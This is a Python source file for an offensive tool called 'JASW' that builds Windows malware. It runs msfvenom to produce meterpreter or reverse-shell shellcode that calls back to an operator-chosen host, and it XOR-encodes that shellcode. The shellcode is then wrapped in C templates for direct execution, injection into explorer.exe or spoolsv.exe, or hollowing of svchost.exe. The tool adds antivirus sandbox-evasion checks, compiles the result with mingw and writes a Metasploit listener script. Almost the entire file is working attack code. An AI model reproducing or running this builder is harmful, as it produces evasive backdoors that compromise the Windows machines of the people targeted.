#!/usr/bin/env python3
import os
import random
import socket
import string
import subprocess

import emoji
import psutil
from termcolor import cprint


def intro():
    from art import text2art
    print(text2art("JASW", "graffiti"))
    print()
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/icyguider/Shhhloader")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " All the guys everywhere and my mommy")
    print()
    print(text2art("JASW", "efti_wall"))


class Bypass:
    """Base class for creating different bypass techniques."""

    def __init__(self):
        self.func_name = ShellCoder.make_random_str()

    def get_template(self):
        """Returns the function template for the bypass technique."""
        raise NotImplementedError("Subclasses should implement this method.")

    def additional_import(self):
        """Returns additional imports required for the bypass."""
        return ""

    def additional_flags(self):
        """Returns additional compilation flags required for the bypass."""
        return []

    def get_call(self):
        """Returns the call statement for the function in template."""
        return f'{self.func_name}() == 1'


class VerifyInputName(Bypass):
    """Class to verify if the input binary name matches a given name."""

    def __init__(self):
        super().__init__()
        self.binary_name = self.ask_for_binary_name()
        self.arg_name = ShellCoder.make_random_str()

    @staticmethod
    def menu():
        return "Verify the binary name"

    def get_template(self):
        """Returns the C code template to verify binary name."""
        return f'''
int {self.func_name}(const char *{self.arg_name}) {{
    if (strstr({self.arg_name}, "{self.binary_name}") == NULL) {{
        return 0; 
    }}
    return 1;
}}
        '''

    def get_call(self):
        """Returns the function call statement with argument."""
        return f'{self.func_name}(argv[0]) == 1'

    @staticmethod
    def ask_for_binary_name():
        print("What is the name of the result binary (without extension)?")
        return input("Name: ")


class AllocateAndFill100MBMemory(Bypass):
    """Class to allocate and fill 100 MB of memory."""

    @staticmethod
    def menu():
        return "Allocate and fill 100MB memory"

    def get_template(self):
        """Returns the C code template to allocate and fill memory."""
        buffer_name = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    char *{buffer_name} = (char *) malloc(100000000);
    if ({buffer_name} == NULL) {{
        return 0;
    }}
    memset({buffer_name}, 0, 100000000);
    free({buffer_name});
    return 1;
}}
        '''


class HundredMillionIncrements(Bypass):
    """Class to perform hundred million increments."""

    @staticmethod
    def menu():
        return "Hundred million increments"

    def get_template(self):
        """Returns the C code template to perform increments."""
        counter = ShellCoder.make_random_str()
        loop_var = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    int {counter} = 0;
    int {loop_var} = 0;
    for ({loop_var} = 0; {loop_var} < 100000000; {loop_var}++) {{
        {counter}++;
    }}
    return {counter} == 100000000 ? 1 : 0;
}}
        '''


class AttemptToOpenASystemProcess(Bypass):
    """Class to attempt opening a system process."""

    @staticmethod
    def menu():
        return "Attempt to open a system process"

    def get_template(self):
        """Returns the C code template to open a system process."""
        handle = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    HANDLE {handle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
    return {handle} != NULL ? 0 : 1;
}}
        '''


class AttemptToOpenANonExistingURL(Bypass):
    """Class to attempt opening a non-existing URL."""

    @staticmethod
    def menu():
        return "Attempt to open a non-existing URL"

    def additional_import(self):
        """Returns necessary imports for Internet functions."""
        return """#include <wininet.h>\n#pragma comment(lib, "wininet.lib")"""

    def additional_flags(self):
        """Returns necessary compilation flags."""
        return ["-lwininet"]

    def get_template(self):
        """Returns the C code template to open a non-existing URL."""
        url = f"http://{ShellCoder.make_random_str()}.{ShellCoder.make_random_str()}.com/"
        url_var = ShellCoder.make_random_str()
        internet_open = ShellCoder.make_random_str()
        internet_url = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    char {url_var}[] = "{url}";
    HINTERNET {internet_open}, {internet_url};
    {internet_open} = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    {internet_url} = InternetOpenUrl({internet_open}, {url_var}, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, NULL);
    if ({internet_url}) {{
        InternetCloseHandle({internet_open});
        InternetCloseHandle({internet_url});
        return 0;
    }}
    InternetCloseHandle({internet_open});
    return 1;
}}
        '''


class NonEmulatedAPINuma(Bypass):
    """Class to use a non-emulated API (VirtualAllocExNuma)."""

    @staticmethod
    def menu():
        return "Non-emulated API (VirtualAllocExNuma)"

    def get_template(self):
        """Returns the C code template for VirtualAllocExNuma API."""
        alloc_var = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    LPVOID {alloc_var} = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    return {alloc_var} == NULL ? 0 : 1;
}}
        '''


class FiberLocalStorage(Bypass):
    """Class to use Fiber Local Storage API."""

    @staticmethod
    def menu():
        return "Fiber Local Storage"

    def get_template(self):
        """Returns the C code template for Fiber Local Storage."""
        fls_var = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    DWORD {fls_var} = FlsAlloc(NULL);
    return {fls_var} == FLS_OUT_OF_INDEXES ? 0 : 1;
}}
        '''


class CheckProcessMemory(Bypass):
    """Class to check the current process memory."""

    @staticmethod
    def menu():
        return "Check process memory"

    def additional_import(self):
        """Returns necessary imports for process memory functions."""
        return """#include <psapi.h>\n#pragma comment(lib, "psapi.lib")"""

    def get_template(self):
        """Returns the C code template to check memory size."""
        mem_counters = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    PROCESS_MEMORY_COUNTERS {mem_counters};
    GetProcessMemoryInfo(GetCurrentProcess(), &{mem_counters}, sizeof({mem_counters}));
    return {mem_counters}.WorkingSetSize <= 3500000 ? 1 : 0;
}}
        '''


class TimeDistortionSleep(Bypass):
    """Class to simulate time distortion with Sleep function."""

    @staticmethod
    def menu():
        return "Time distortion (Sleep)"

    def additional_flags(self):
        """Returns necessary compilation flags."""
        return ["-lwinmm"]

    def additional_import(self):
        """Returns necessary imports for time functions."""
        return """#include <time.h>\n#pragma comment(lib, "winmm.lib")"""

    def get_template(self):
        """Returns the C code template to check time delay."""
        start_time = ShellCoder.make_random_str()
        end_time = ShellCoder.make_random_str()
        return f'''
int {self.func_name}() {{
    DWORD {start_time} = timeGetTime();
    Sleep(10000);
    DWORD {end_time} = timeGetTime();
    return {end_time} < ({start_time} + 9990) ? 0 : 1;
}}
        '''


class ShellCoder:
    ARCH_X64 = 1
    ARCH_X86 = 2

    STAGED_PAYLOAD = 1
    NON_STAGED_PAYLOAD = 2

    def __init__(self):
        self.selected_ip = self.ask_ip_address()
        self.selected_port = self.ask_lport()
        self.exit_func = self.ask_for_exit_func()
        self.output_path = self.ask_output_path()
        self.arch_output = self.ask_architecture()
        self.template_path = None
        self.shellcode_path = None
        self.commands = []
        self.selected_bypass = []
        self.additional_flags = []

    @staticmethod
    def make_random_str(length_range=(8, 35)):
        """Generate a random alphanumeric string."""
        length = random.randint(*length_range)
        return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def write_template(self, template_content):
        """Write the provided template content to the template file path."""
        if not self.template_path:
            raise ValueError("Template path is not defined.")

        with open(self.template_path, 'w') as f:
            f.write(template_content)

    @staticmethod
    def ask_architecture():
        """Prompt the user to select the architecture of the output binary."""
        cprint("Select architecture for the output binary:", "white", "on_blue")

        while True:
            print(emoji.emojize(":right_arrow:") + " [1] x64")
            print(emoji.emojize(":right_arrow:") + " [2] x86")

            choice = input(" ? - ")
            if choice == '1':
                return ShellCoder.ARCH_X64
            elif choice == '2':
                return ShellCoder.ARCH_X86
            else:
                cprint("Invalid choice. Please select 1 or 2.", "red")

    @staticmethod
    def ask_ip_address():
        """Prompt the user to select an IP address from available network interfaces."""
        ips = [
            addr.address
            for interface in psutil.net_if_addrs().values()
            for addr in interface if addr.family == socket.AF_INET
        ]

        if not ips:
            raise RuntimeError("No IPv4 addresses found on any network interfaces.")

        cprint("Select LHOST from available network interfaces:", "white", "on_blue")

        while True:
            for i, ip in enumerate(ips, start=1):
                print(emoji.emojize(":right_arrow:") + f" [{i}] {ip}")

            try:
                selected = int(input(" ? ")) - 1
                return ips[selected]
            except (ValueError, IndexError):
                cprint("Invalid selection. Please try again.", "red")

    @staticmethod
    def ask_lport():
        """Prompt the user to input a local port (LPORT)."""
        cprint("Enter LPORT:", "white", "on_blue")

        while True:
            try:
                port = int(input(" ? "))
                if 1 <= port <= 65535:
                    return port
                else:
                    cprint("Port number must be between 1 and 65535.", "red")
            except ValueError:
                cprint("Invalid port number. Please enter a valid integer.", "red")

    @staticmethod
    def ask_for_exit_func():
        """Prompt the user to select an exit function type."""
        cprint("Select EXIT function type:", "white", "on_blue")

        options = {"1": "process", "2": "thread", "3": "seh"}

        while True:
            print(emoji.emojize(":right_arrow:") + " [1] process")
            print(emoji.emojize(":right_arrow:") + " [2] thread")
            print(emoji.emojize(":right_arrow:") + " [3] SEH")

            choice = input(" ? - ")
            exit_func = options.get(choice)
            if exit_func:
                return exit_func
            else:
                cprint("Invalid choice. Please select 1, 2, or 3.", "red")

    @staticmethod
    def ask_output_path():
        """Prompt the user to specify an existing path for saving output files."""
        cprint("Specify output path for binaries and scripts (path must exist):", "white", "on_blue")

        while True:
            path = input(" ? ")
            if os.path.exists(path):
                return path
            else:
                cprint("Path does not exist. Please enter a valid path.", "red")


class Windows(ShellCoder):
    """Class for handling Windows-specific payload generation and injection techniques with anti-virus bypass."""

    exe_name = None
    payload = None
    injection_technique = None
    available_bypass = [
        VerifyInputName,
        AllocateAndFill100MBMemory,
        HundredMillionIncrements,
        AttemptToOpenASystemProcess,
        AttemptToOpenANonExistingURL,
        NonEmulatedAPINuma,
        FiberLocalStorage,
        CheckProcessMemory,
        TimeDistortionSleep,
    ]

    def __init__(self):
        """Initializes the class with user-defined injection technique, payload, and selected bypass techniques."""
        super().__init__()
        self.injection_technique = self.ask_for_technique()
        self.payload = self.ask_for_payload()
        self.selected_bypass = self.ask_for_bypass()
        self.gen_shellcode()
        self.generate_template()
        self.compile_payload()
        print("Initialization complete.")

    def gen_shellcode(self):
        """Generates shellcode using msfvenom and creates listener scripts for Metasploit."""
        self.shellcode_path = os.path.join(self.output_path, "shellcode.raw")

        msfvenom_command = [
            'msfvenom', '-p', self.payload,
            f'LHOST={self.selected_ip}',
            f'LPORT={self.selected_port}',
            f'EXITFUNC={self.exit_func}',
            '-a', 'x64' if 'x64' in self.payload else 'x86',
            '-f', 'raw',
            '-o', self.shellcode_path
        ]

        shellcode_script_path = os.path.join(self.output_path, "generate.sh")
        with open(shellcode_script_path, 'w') as f:
            f.write(f"#!/bin/bash\n\n{' '.join(msfvenom_command)}\n")

        listener_command = (
            f"msfconsole -q -x 'use multi/handler; "
            f"set payload {self.payload}; set LHOST {self.selected_ip}; "
            f"set LPORT {self.selected_port}; set EXITFUNC {self.exit_func}; exploit'"
        )
        listener_script_path = os.path.join(self.output_path, "listener.sh")
        with open(listener_script_path, 'w') as f:
            f.write(f"#!/bin/bash\n\n{listener_command}\n")

        subprocess.run(msfvenom_command, check=True)

    @staticmethod
    def xor_shellcode(data: bytes, key: str) -> str:
        """Encrypts shellcode using XOR with a given key and returns it as a hex string."""
        key_len = len(key)
        key_as_int = [ord(char) for char in key]
        encrypted_data = bytes((data[i] ^ key_as_int[i % key_len]) for i in range(len(data)))
        return "\\x" + "\\x".join(format(b, '02x') for b in encrypted_data)

    def open_shellcode(self, x_key: str) -> str:
        """Reads shellcode from file and applies XOR encoding with the given key."""
        with open(self.shellcode_path, "rb") as raw_shellcode:
            shellcode_data = bytearray(raw_shellcode.read())
        return self.xor_shellcode(shellcode_data, x_key)

    def shellcode_runner_template(self, bypass_functions: str, bypass_calls: str, bypass_imports: str) -> str:
        """Generates a C++ template for running shellcode with optional bypass functions and imports."""
        xor_var, xor_key, shellcode_var, counter_var, increment_var, v_alloc_var, decoded_shellcode_var = (
            self.make_random_str() for _ in range(7)
        )
        encoded_shellcode = self.open_shellcode(xor_key)

        return f"""#include <windows.h>
#include <string>
{bypass_imports}

using namespace std;

{bypass_functions}

int main(int argc, char **argv) {{
    if ({bypass_calls}) {{
        char {xor_var}[] = "{xor_key}";
        char {shellcode_var}[] = "{encoded_shellcode}";
        char {decoded_shellcode_var}[sizeof {shellcode_var}];

        int {counter_var} = 0;
        for (int {increment_var} = 0; {increment_var} < sizeof {shellcode_var}; ++{increment_var}) {{
            if ({counter_var} == sizeof {xor_var} - 1) {{
                {counter_var} = 0;
            }}
            {decoded_shellcode_var}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
            ++{counter_var};
        }}

        void *{v_alloc_var} = VirtualAlloc(0, sizeof {decoded_shellcode_var}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy({v_alloc_var}, {decoded_shellcode_var}, sizeof {decoded_shellcode_var});
        ((void(*)()){v_alloc_var})();
    }} else {{
        printf("Bypass condition not met. Exiting...\\n");
        return 0;
    }}
    return 0;
}}
"""

    def process_injection_template(self, bypass_functions, bypass_calls, bypass_imports):
        """Generates C++ template for process injection with optional bypass functions and imports."""
        (xor_var,
         xor_key,
         shellcode_var,
         counter_var,
         increment_var,
         decoded_shellcode_var,
         process_handle,
         remote_buffer,
         is_elevated,
         admin_group,
         is_admin,
         nt_authority,
         find_process_id,
         h_process_snap,
         pe32,
         result,
         process_name,
         shellcode,
         remote_thread,
         ) = (self.make_random_str() for _ in range(19))
        encoded_shellcode = self.open_shellcode(xor_key)

        return f"""#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <sddl.h>

{bypass_imports}

using namespace std;

{bypass_functions}

BOOL {is_elevated}() {{
    PSID {admin_group};
    BOOL {is_admin};
    SID_IDENTIFIER_AUTHORITY {nt_authority} = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&{nt_authority}, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &{admin_group})) {{
        return FALSE;
    }}
    if (!CheckTokenMembership(NULL, {admin_group}, &{is_admin})) {{
        {is_admin} = FALSE;
    }}
    FreeSid({admin_group});
    return {is_admin};
}}

DWORD {find_process_id}()
{{
    HANDLE {h_process_snap};
    PROCESSENTRY32 {pe32};
    DWORD {result} = 0;

    char *{process_name};

    if ({is_elevated}()) {{
        {process_name} = "spoolsv.exe";
    }} else {{
        {process_name} = "explorer.exe";
    }}

    {h_process_snap} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (INVALID_HANDLE_VALUE == {h_process_snap}) {{
        return(FALSE);
    }}

    {pe32}.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First({h_process_snap}, &{pe32}))
    {{
        CloseHandle({h_process_snap});
        return(0);
    }}

    do
    {{
        if (0 == strcmp({process_name}, {pe32}.szExeFile))
        {{
            {result} = {pe32}.th32ProcessID;
            break;
        }}
    }} while (Process32Next({h_process_snap}, &{pe32}));

    CloseHandle({h_process_snap});

    return {result};
}}

int main(int argc, char **argv) {{
    int res = -1;

    if (res == 0) {{
        printf("We start now !!");
    }}

    if ({bypass_calls}) {{
        char {xor_var}[] = "{xor_key}";
        char {shellcode_var}[] = "{encoded_shellcode}";
        char {shellcode}[sizeof {shellcode_var}];

        int {counter_var} = 0;
        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
            if({counter_var} == sizeof {xor_var} -1) {{
                {counter_var}=0;
            }}
            {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
            {counter_var}++;
        }}

        HANDLE {process_handle};
        HANDLE {remote_thread};
        PVOID {remote_buffer};

        {process_handle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {find_process_id}());
        {remote_buffer} = VirtualAllocEx({process_handle}, NULL, sizeof {shellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory({process_handle}, {remote_buffer}, {shellcode}, sizeof {shellcode}, NULL);
        {remote_thread} = CreateRemoteThread({process_handle}, NULL, 0, (LPTHREAD_START_ROUTINE){remote_buffer}, NULL, 0, NULL);
        CloseHandle({process_handle});
    }} else {{
        printf("in the second condition");
    }}

    return 0;
}} 
"""

    def shellcode_process_hollowing(self, bypass_functions, bypass_calls, bypass_imports):
        (xor_key,
         xor_var,
         shellcode_var,
         shellcode,
         counter_var,
         increment_var,
         si,
         pi,
         ctx,
         old_protect,
         res,
         process_name,
         base_address,
         ) = (self.make_random_str() for _ in range(13))
        encoded_shellcode = self.open_shellcode(xor_key)

        return f"""#include <windows.h>
#include <stdio.h>

{bypass_imports}

{bypass_functions}

int main(int argc, char **argv) {{

    int res = -1;

    if (res == 0) {{
        printf("We start now !!");
    }}

    if ({bypass_calls}) {{
        char {xor_var}[] = "{xor_key}";
        char {shellcode_var}[] = "{encoded_shellcode}";
        char {shellcode}[sizeof {shellcode_var}];

        int {counter_var} = 0;
        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
            if({counter_var} == sizeof {xor_var} -1) {{
                {counter_var}=0;
            }}
            {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
            {counter_var}++;
        }}

        STARTUPINFO {si};
        PROCESS_INFORMATION {pi};
        CONTEXT {ctx};
        DWORD {old_protect};
        BOOL {res};

        ZeroMemory(&{si}, sizeof({si}));
        {si}.cb = sizeof({si});
        ZeroMemory(&{pi}, sizeof({pi}));

        {res} = CreateProcess(
            "c:\\windows\\system32\\svchost.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &{si},
            &{pi}
        );

        if (!{res}) {{
            return 1;
        }}

        {ctx}.ContextFlags = CONTEXT_FULL;
        {res} = GetThreadContext({pi}.hThread, &{ctx});

        if (!{res}) {{
            return 2;
        }}

        DWORD {base_address};
        if (!ReadProcessMemory({pi}.hProcess, (LPCVOID)({ctx}.Rbx + 8), &{base_address}, sizeof(DWORD), NULL)) {{
            return 3;
        }}

        if (!VirtualProtectEx({pi}.hProcess, (LPVOID){base_address}, sizeof({shellcode}), PAGE_EXECUTE_READWRITE, &{old_protect})) {{
            return 4;
        }}

        if (!WriteProcessMemory({pi}.hProcess, (LPVOID){base_address}, {shellcode}, sizeof({shellcode}), NULL)) {{
            return 5;
        }}

        if (!VirtualProtectEx({pi}.hProcess, (LPVOID){base_address}, sizeof({shellcode}), {old_protect}, &{old_protect})) {{
            return 6;
        }}

        {ctx}.Rip = {base_address};

        if (!SetThreadContext({pi}.hThread, &{ctx})) {{
            return 7;
        }}

        if (ResumeThread({pi}.hThread) == -1) {{
            return 8;
        }}

        CloseHandle({pi}.hThread);
        CloseHandle({pi}.hProcess);

        return 0;
    }}
}}
        """

    @staticmethod
    def ask_for_payload():
        """Prompts the user to select a payload type."""
        payloads = [
            'windows/x64/meterpreter/reverse_https',
            'windows/x64/meterpreter/reverse_tcp',
            'windows/x64/shell/reverse_tcp',
            'windows/meterpreter/reverse_https',
            'windows/meterpreter/reverse_tcp',
            'windows/shell/reverse_https',
            'windows/shell/reverse_tcp',
        ]
        cprint("Select the payload to use:", "white", "on_blue")
        while True:
            for i, payload in enumerate(payloads):
                print(emoji.emojize(":right_arrow:") + f" [{i + 1}] {payload}")
            try:
                selected_answer = int(input(" ?")) - 1
                return payloads[selected_answer]
            except (ValueError, IndexError):
                print("Invalid selection, please try again.")

    @staticmethod
    def ask_for_technique():
        """Prompts the user to select an injection technique."""
        techniques = {
            "1": "shellcode runner",
            "2": "process injection",
            "3": "process hollowing",
        }
        cprint("Select an injection technique:", "white", "on_blue")
        for key, value in techniques.items():
            print(emoji.emojize(":right_arrow:") + f" [{key}] - {value}")
        return input(" ? ")

    def ask_for_bypass(self):
        """Prompts the user to select antivirus evasion techniques."""
        cprint("Select one or more AV evasion techniques (e.g., 1,3,4):", "white", "on_blue")
        for i, bypass in enumerate(self.available_bypass):
            print(emoji.emojize(":right_arrow:") + f" [{i + 1}] {bypass.menu()}")
        while True:
            try:
                selected = [self.available_bypass[int(x) - 1] for x in input(" ? ").split(',')]
                return selected
            except (ValueError, IndexError):
                print("Invalid selection, please try again.")

    def generate_bypass_code(self):
        """Generates code components for bypass functions, calls, and imports based on selected bypass techniques."""
        bypass_functions = []
        bypass_calls = []
        bypass_imports = []

        for bypass in self.selected_bypass:
            instance = bypass()
            bypass_functions.append(instance.get_template())
            bypass_calls.append(instance.get_call())

            additional_import = instance.additional_import()
            if additional_import:
                bypass_imports.append(additional_import)

            self.additional_flags += instance.additional_flags()

        return '\n\n'.join(bypass_functions), ' && '.join(bypass_calls), '\n'.join(bypass_imports)

    def generate_template(self):
        """Generates the appropriate template for the selected injection technique, using bypass components."""
        bypass_functions, bypass_calls, bypass_imports = self.generate_bypass_code()

        if self.injection_technique == "1":
            template = self.shellcode_runner_template(bypass_functions, bypass_calls, bypass_imports)
        elif self.injection_technique == "2":
            template = self.process_injection_template(bypass_functions, bypass_calls, bypass_imports)
        elif self.injection_technique == "3":
            template = self.shellcode_process_hollowing(bypass_functions, bypass_calls, bypass_imports)
        else:
            raise NotImplementedError("Unknown injection technique")

        self.template_path = f"{self.output_path}/template.c"
        self.write_template(template)

    def compile_payload(self):
        """Compiles the payload using cross-compilation tools with optimized flags for minimizing binary size."""
        if self.arch_output == ShellCoder.ARCH_X86:
            compiler = "i686-w64-mingw32-g++"
        else:
            compiler = "x86_64-w64-mingw32-g++"

        command = (
            f"{compiler} {self.template_path} -o {self.output_path}/shellcoder.exe "
            "-lws2_32 -s -w -fomit-frame-pointer -fno-unwind-tables -ffunction-sections "
            "-fno-ident -fdata-sections -Wno-write-strings -fno-exceptions "
            "-fmerge-all-constants -static-libstdc++ -static-libgcc -lntdll -Wl,--gc-sections"
        )

        for flag in self.additional_flags:
            if flag not in command:
                command += f" {flag}"

        compile_script = f"""#!/bin/bash

{command.replace(f"{self.output_path}/", './')}
"""

        with open(f"{self.output_path}/compile.sh", 'w') as f:
            f.write(compile_script)

        os.system(command)


if '__main__' == __name__:
    intro()
    print()
    win = Windows()
# cprint(" What kind of target is it?", "white", "on_blue")
# print()
# print(emoji.emojize(":right_arrow:") + " [1] Windows ")
# print(emoji.emojize(":right_arrow:") + " [2] Linux ")
# target = input(" ? ")
# if target == '1':
#     win = Windows()
# elif target == '2':
# Linux()
# else:
#   raise Exception("Unknown target")
